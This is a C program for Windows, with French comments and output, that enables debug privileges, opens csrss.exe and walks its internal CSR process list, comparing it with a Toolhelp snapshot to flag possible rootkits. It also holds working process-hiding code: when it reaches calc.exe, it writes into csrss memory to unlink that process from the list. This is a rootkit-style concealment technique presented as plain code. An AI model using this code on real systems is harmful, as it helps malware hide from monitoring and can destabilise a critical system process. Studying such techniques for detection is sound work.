#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

int SetDebugPrivileges();
typedef long (*CSR)( );

typedef struct _CLIENT_ID
{
     PVOID UniqueProcess;
     PVOID UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _CSR_PROCESS
{
 CLIENT_ID          ClientId;
 struct _LIST_ENTRY ListLink;
 struct _LIST_ENTRY ThreadList;
 struct _CSR_NT_SESSION* NtSession;
 ULONG ExpectedVersion;
 void* ClientPort;
 char* ClientViewBase;
 char* ClientViewBounds;
 void* ProcessHandle;
 ULONG SequenceNumber;
 ULONG Flags;
 ULONG DebugFlags;
 ULONG ReferenceCount;
 ULONG ProcessGroupId;
 ULONG ProcessGroupSequence;
 ULONG fVDM;
 ULONG ThreadCount;
 ULONG LastMessageSequence;
 ULONG NumOutstandingMessages;
 ULONG ShutdownLevel;
 ULONG ShutdownFlags;
 LUID  Luid;
 void* ServerDllPerProcessData[1];
} CSR_PROCESS, *PCSR_PROCESS;

/*
.text:75AD52D3                         _CsrLockProcessByClientId@8 proc near   ; CODE XREF: CsrCreateRemoteThread(x,x)+2Fp
.text:75AD52D3
.text:75AD52D3                         arg_0           = dword ptr  8
.text:75AD52D3                         arg_4           = dword ptr  0Ch
.text:75AD52D3
.text:75AD52D3 8B FF                                   mov     edi, edi
.text:75AD52D5 55                                      push    ebp
.text:75AD52D6 8B EC                                   mov     ebp, esp
.text:75AD52D8 53                                      push    ebx
.text:75AD52D9 56                                      push    esi
.text:75AD52DA 57                                      push    edi
.text:75AD52DB BF A0 89 AD 75                          mov     edi, offset _CsrProcessStructureLock
.text:75AD52E0 57                                      push    edi
.text:75AD52E1 FF 15 18 11 AD 75                       call    ds:__imp__RtlEnterCriticalSection@4 ; RtlEnterCriticalSection(x)
.text:75AD52E7 8B 55 0C                                mov     edx, [ebp+arg_4]
.text:75AD52EA 83 22 00                                and     dword ptr [edx], 0
.text:75AD52ED 8B 35 1C 89 AD 75                       mov     esi, _CsrRootProcess <-
.text:75AD52F3 83 C6 08                                add     esi, 8
.text:75AD52F6 C7 45 0C 01 00 00 C0                    mov     [ebp+arg_4], 0C0000001h
.text:75AD52FD 8B CE                                   mov     ecx, esi
*/

int main()
{
    long           crssPid , i , CsrRootProcess , lastValue , flag;
    DWORD          ret;
    CSR            CsrGetProcessId;
    HMODULE        hLibCsr , hLibNtdll;
    HANDLE         hProcess , snapshot;
    PUCHAR         CsrLockProcessByClientId , CsrRootProcess_ ;
    CSR_PROCESS    csrProcess;
    LIST_ENTRY     listEntry;
    PROCESSENTRY32 structprocsnapshot = {0};

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    flag = 0;


    hLibCsr   = LoadLibrary("csrsrv.dll");
    hLibNtdll = LoadLibrary("ntdll.dll");

    if(hLibCsr == NULL || hLibNtdll == NULL || snapshot == INVALID_HANDLE_VALUE)
        return 0;

    CsrLockProcessByClientId = (PUCHAR)GetProcAddress( hLibCsr , "CsrLockProcessByClientId" );
    CsrGetProcessId = (CSR)GetProcAddress( hLibNtdll , "CsrGetProcessId" );

    if(CsrLockProcessByClientId == NULL || CsrGetProcessId == NULL)
        return 0;

    SetDebugPrivileges();
    crssPid = CsrGetProcessId();
    hProcess = OpenProcess( PROCESS_ALL_ACCESS , FALSE , crssPid );

    printf("Enumerate ur process par 0vercl0k.\n\n");
    printf("Crss trouve, Process id : %ld.\n" , crssPid );
    printf("Scan de csrsrv.dll à la recherche de l'adresse de la liste..\n\n");
    for( i = 0 ; i < 50 ; i++ )
    {
        if( (*(CsrLockProcessByClientId+i) == 0x83) && (*(CsrLockProcessByClientId+i+1) == 0x22) && (*(CsrLockProcessByClientId+i+2) == 0x00) && (*(CsrLockProcessByClientId+i+3) == 0x8B) && (*(CsrLockProcessByClientId+i+4) == 0x35) &&
            (*(CsrLockProcessByClientId+i+9) == 0x83) && (*(CsrLockProcessByClientId+i+10) == 0xC6) && (*(CsrLockProcessByClientId+i+11) == 0x08) )
            {
                CsrRootProcess_ = (PUCHAR)(*(PULONG)(CsrLockProcessByClientId+i+5));
                ReadProcessMemory( hProcess , CsrRootProcess_ , &CsrRootProcess , sizeof(long) , &ret );
                if(ret != sizeof(long))
                    return 0;

                break;
            }
        printf(".");
    }
    if( i == 50 )
        return 0;

    printf("\n\nTête de liste trouvé dans la dll(0x%x) : 0x%x.\n" , (unsigned int)CsrRootProcess_ , (unsigned int)CsrRootProcess);
    printf("Lecture des données dans le processus <csrss.exe>..\n");
    ReadProcessMemory( hProcess , (LPCVOID)CsrRootProcess , &csrProcess , sizeof(CSR_PROCESS) , NULL );
    listEntry  = (csrProcess.ListLink);
    lastValue  = (long)listEntry.Blink;

    printf("Process :     <csrss.exe>.\n");
    i = 1;
    do
    {
        ZeroMemory(&csrProcess , sizeof(CSR_PROCESS));
        ZeroMemory(&structprocsnapshot , sizeof(PROCESSENTRY32));
        structprocsnapshot.dwSize = sizeof(PROCESSENTRY32);

        ReadProcessMemory( hProcess , (LPCVOID)((PUCHAR)listEntry.Flink - 0x8)  , &csrProcess , sizeof(CSR_PROCESS) , NULL );

        if(Process32First(snapshot,&structprocsnapshot) == FALSE)
            return 0;

        while(Process32Next(snapshot,&structprocsnapshot))
        {
            if(structprocsnapshot.th32ProcessID == (DWORD)csrProcess.ClientId.UniqueProcess)
            {
                flag = 1;
                break;
            }
        }
       if( strncmp("calc.exe" , structprocsnapshot.szExeFile , strlen(structprocsnapshot.szExeFile)) == 0)
        {
            printf("Unlink du processus..\n");
            long tapz = (long)csrProcess.ListLink.Flink;
            long tapz2 = (long)csrProcess.ListLink.Blink;
            WriteProcessMemory( hProcess , (LPVOID)(csrProcess.ListLink.Blink) , &tapz , sizeof(long) , &ret ); //En écrivant en csrProcess.ListLink.Blink, on tombe sur la struct precedente, et sur son premier champs,
                                                                                                              // autrement dit son Flink :).
            WriteProcessMemory( hProcess , (LPVOID)((PUCHAR)csrProcess.ListLink.Flink + 4) , &tapz2 , sizeof(long) , &ret );
        }

        if(flag == 1)
            printf("Process :     <%s>.\n" , /*csrProcess.ClientId.UniqueProcess,*/structprocsnapshot.szExeFile);
        else
            printf("Process :     <rootkit?> <- un potentiel rk ?:).\n");

        listEntry = csrProcess.ListLink;
        i++;
        flag = 0;
    }while((long)listEntry.Flink != lastValue);

    printf("Nombre total de processus : %ld.\n\n" , i );

    FreeLibrary(hLibCsr);
    FreeLibrary(hLibNtdll);
    CloseHandle(hProcess);
    CloseHandle(snapshot);

    return 0;
}

int SetDebugPrivileges()
{
    TOKEN_PRIVILEGES privilege;
    HANDLE processCourant = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId()) , jetonproc;

    OpenProcessToken(processCourant, TOKEN_ALL_ACCESS, &jetonproc);
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &privilege.Privileges[0].Luid);

    privilege.PrivilegeCount = 1;
    privilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(jetonproc, FALSE, &privilege, 0, NULL, NULL);

    CloseHandle(jetonproc);
    CloseHandle(processCourant);
    return 1;
}
